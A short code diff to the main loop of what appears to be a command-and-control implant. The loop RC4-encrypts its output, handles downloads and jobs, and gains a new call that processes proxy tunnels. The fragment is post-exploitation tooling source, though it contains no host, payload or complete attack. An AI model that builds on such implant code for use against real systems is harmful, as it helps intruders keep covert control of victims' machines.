@@ -31,7 +31,7 @@ void AgentMain()
 	do {
 		if (packerOut->GetDataSize() > 4) {
 			packerOut->Set32(0, packerOut->GetDataSize());
-			
+
 			BYTE* data = packerOut->GetData();
 			ULONG dataSize = packerOut->GetDataSize();
 			EncryptRC4(data, dataSize, g_Agent->SessionKey, 16);
@@ -55,11 +55,13 @@ void AgentMain()
 
 		g_Agent->downloader->ProcessDownloadTasks(packerOut);			
 		g_Agent->jober->ProcessJobs(packerOut);
+		g_Agent->proxyfire->ProcessTunnels(packerOut);
 
 	} while ( g_Agent->IsActive() );
 
 	g_Agent->commander->Exit(packerOut);
 
+	packerOut->Set32(0, packerOut->GetDataSize());
 	BYTE* data     = packerOut->GetData();
 	ULONG dataSize = packerOut->GetDataSize();
 	EncryptRC4(data, dataSize, g_Agent->SessionKey, 16);
